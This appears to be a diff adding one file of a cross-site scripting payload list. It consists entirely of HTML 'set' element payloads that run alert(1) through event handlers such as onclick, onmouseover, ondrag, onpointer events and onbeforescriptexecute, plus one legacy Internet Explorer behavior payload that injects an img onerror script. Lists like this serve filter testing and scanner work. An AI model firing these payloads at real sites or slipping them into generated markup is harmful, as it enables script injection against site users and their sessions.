@@ -1,0 +1,36 @@
+<set draggable="true" ondrag="alert(1)">test</set>
+<set draggable="true" ondragend="alert(1)">test</set>
+<set draggable="true" ondragenter="alert(1)">test</set>
+<set draggable="true" ondragleave="alert(1)">test</set>
+<set draggable="true" ondragstart="alert(1)">test</set>
+<set id=x tabindex=1 onactivate=alert(1)></set>
+<set id=x tabindex=1 onbeforeactivate=alert(1)></set>
+<set id=x tabindex=1 onbeforedeactivate=alert(1)></set><input autofocus>
+<set id=x tabindex=1 ondeactivate=alert(1)></set><input id=y autofocus>
+<set onafterscriptexecute=alert(1)><script>1</script>
+<set onbeforescriptexecute=alert(1)><script>1</script>
+<set onclick="alert(1)">test</set>
+<set oncontextmenu="alert(1)">test</set>
+<set oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<set oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<set ondblclick="alert(1)" autofocus tabindex=1>test</set>
+<set onkeydown="alert(1)" contenteditable>test</set>
+<set onkeypress="alert(1)" contenteditable>test</set>
+<set onkeyup="alert(1)" contenteditable>test</set>
+<set onmousedown="alert(1)">test</set>
+<set onmouseenter="alert(1)">test</set>
+<set onmouseleave="alert(1)">test</set>
+<set onmousemove="alert(1)">test</set>
+<set onmouseout="alert(1)">test</set>
+<set onmouseover="alert(1)">test</set>
+<set onmouseup="alert(1)">test</set>
+<set onmousewheel=alert(1)>requires scrolling
+<set onpointerdown=alert(1)>XSS</set>
+<set onpointerenter=alert(1)>XSS</set>
+<set onpointerleave=alert(1)>XSS</set>
+<set onpointermove=alert(1)>XSS</set>
+<set onpointerout=alert(1)>XSS</set>
+<set onpointerover=alert(1)>XSS</set>
+<set onpointerrawupdate=alert(1)>XSS</set>
+<set onpointerup=alert(1)>XSS</set>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
